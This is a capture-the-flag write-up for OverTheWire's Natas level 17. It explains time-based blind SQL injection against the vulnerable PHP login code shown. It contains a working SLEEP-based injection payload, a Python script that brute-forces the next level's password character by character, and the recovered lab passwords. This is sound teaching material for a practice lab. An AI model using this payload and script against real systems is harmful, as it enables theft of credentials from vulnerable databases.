- This level is again going to test our SQLi skills, but with a twist
- First, let's analyse the mimic source code that we are presented with:
```php
<?php
/*
CREATE TABLE `users` (
`username` varchar(64) DEFAULT NULL,
`password` varchar(64) DEFAULT NULL
);
*/
if(array_key_exists("username", $_REQUEST)) {
	$link = mysqli_connect('localhost', 'natas17', '<censored>');
	mysqli_select_db($link, 'natas17');
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
	if(array_key_exists("debug", $_GET)) {
		echo "Executing query: $query<br>";
	}
	$res = mysqli_query($link, $query);
	if($res) {
		if(mysqli_num_rows($res) > 0) {
			//echo "This user exists.<br>";
		} else {
			//echo "This user doesn't exist.<br>";
		}
	} else {
	//echo "Error in query.<br>";
	}
mysqli_close($link);
}
?>
```
- This time, we are not getting any output based on whatever query we write. Moreover, we can't even verify if our query is correct or not (apart from seeing the debug query statement)
- This means there's no possibility for us to directly brute force the password character by character as we will not get any feedback
- So we need to think of something else that can provide us the required feedback
- Now here comes into picture the saviour for us: Time based SQL injection
- This form of SQL injection plays on the difference in timing of a successful query vs a non successful query
- For this problem, we can write the following payload to brute force the characters:
```SQL
" OR (username = "natas18"  AND IF(SUBSTRING(password, 1, 1) = BINARY "a", SLEEP(5) ,1)) -- 
```
- The payload might look gibberish, but let me break it down to make it comprehensible:
	- The payload does an AND between two operands, the left one being a simple comparison and the right one being an IF statement in MySQL
	- The IF statement in MySQL has the following syntax: ```IF(EXPRESSION, Code to execute if true, code to execute if false)```
	- Going over the IF statement, we can see that the expression is the ```SUBSTRING``` function that does some comparison, then if the comparison result is true, the ```SLEEP(5)``` command is run, and if the result is false, ```1``` is returned
	- Coming to the ```SUBSTRING``` function, it takes three parameters, the string or the column name, the start index (strings in MySQL start with index 1), and the length of the substring
	- So in the function, we compare that if the substring of length 1 starting at index 1 is equal to ```a```
	- Hence, the whole IF statement does the following:
		- If the password begins with ```a```, it will cause the MySQL server to sleep for 5 seconds, thereby delaying our response by 5 seconds
		- Otherwise, there would be no delay and our response will come after the normal delay
- Now, we can run this payload over and over again with varying length of the substring, which will reveal the password
- The script for doing the same is follows:
```python
import requests
from requests.auth import HTTPBasicAuth
URL = "http://natas17.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
password_str = ""
i = 1
while True:
# Since there are only 64 characters in the column, we will be this loop for 64 times only
	for character in CHARACTER_LIST:
		guess_str = password_str + character
		sqli_query = f" \" OR (username = \"natas18\" AND IF(SUBSTRING(password, 1, {i}) = BINARY \"{guess_str}\", SLEEP(5) ,1)) -- "
		print(f"SQLi payload: {sqli_query}")
		data = {'username' : sqli_query}
		r = requests.post(url = URL, data = data, auth= auth)
		print(f"Time it took for response with character {character}:{r.elapsed.total_seconds()}")
		if (r.elapsed.total_seconds() >= 5.0):
			print(f"Guess character {character} caused the query to finish in more time than expected")
			password_str += character
			i += 1
			break
	if len(password_str) == 32:
		break

print(password_str)
```
- Obtained password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ